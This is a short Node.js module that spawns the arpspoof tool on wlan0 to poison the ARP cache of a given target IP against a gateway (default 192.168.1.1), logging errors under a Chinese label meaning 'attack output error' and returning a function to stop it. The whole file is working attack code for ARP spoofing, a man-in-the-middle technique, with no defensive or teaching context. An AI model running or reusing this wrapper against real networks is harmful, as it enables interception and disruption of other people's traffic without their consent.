const { spawn } = require('child_process');
const fs = require('fs');

module.exports = (ip, gateway) => {
    const arg = ['-i', 'wlan0', '-t', ip, gateway || '192.168.1.1'];
    const command = spawn('arpspoof', arg);
    let count = 0;
    command.stderr.on('data', data => {
        if (count >= 1) {
            return;
        }
        count += 1;
        fs.writeFile('./log', `${ip}的攻击输出错误\n${data}\n`, err => {
            err ? console.log(err) : void 0;
        });
    });

    command.on('close', code => {
        console.log(`退出 ${code}`);
    });
    return () => {
        command.kill();
    };
};
